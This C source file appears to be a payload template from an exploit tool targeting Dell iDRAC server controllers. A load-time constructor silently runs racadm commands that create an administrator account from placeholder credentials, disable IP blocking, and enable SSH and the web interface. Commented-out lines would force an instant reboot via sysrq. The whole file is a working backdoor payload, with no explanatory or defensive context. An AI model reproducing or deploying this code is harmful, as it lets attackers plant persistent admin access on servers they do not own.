#include <unistd.h>
#include <stdio.h>

static void main(void) __attribute__((constructor));
static void main(void)
{
    {
        // int pid0 = fork();
        // if (!pid0)
        // {
        //     {
        //         execlp("sh", "sh", "-c", "echo b > /proc/sysrq-trigger", (char *)NULL);
        //     }
        // }
        int pid1 = fork();
        if (!pid1)
        {
            {
                execlp("racadm", "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminUserName", "{username}", (char *)NULL);
            }
        }
        int pid2 = fork();
        if (!pid2)
        {
            {
                execlp("racadm", "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPassword", "{password}", (char *)NULL);
            }
        }
        int pid3 = fork();
        if (!pid3)
        {
            {
                execlp("racadm", "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPrivilege", "{privilege}", (char *)NULL);
            }
        }
        int pid4 = fork();
        if (!pid4)
        {
            {
                execlp("racadm", "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminEnable", "1", (char *)NULL);
            }
        }
        // int pid5 = fork();
        // if (!pid5)
        // {
        //     {
        //         execlp("sh", "sh", "/avct/sbin/enterprise.sh", (char *)NULL);
        //     }
        // }
        int pid6 = fork();
        if (!pid6)
        {
            {
                execlp("racadm", "racadm", "set", "iDRAC.IPBlocking.RangeEnable", "Disabled", (char *)NULL);
            }
        }
        int pid7 = fork();
        if (!pid7)
        {
            {
                execlp("racadm", "racadm", "set", "iDRAC.SSH.Enable", "1", (char *)NULL);
            }
        }
        int pid8 = fork();
        if (!pid8)
        {
            {
                execlp("racadm", "racadm", "set", "iDRAC.WebServer.Enable", "1", (char *)NULL);
            }
        }
        // Note: it takes 5 to 10 minutes before these commands are executed
    }
}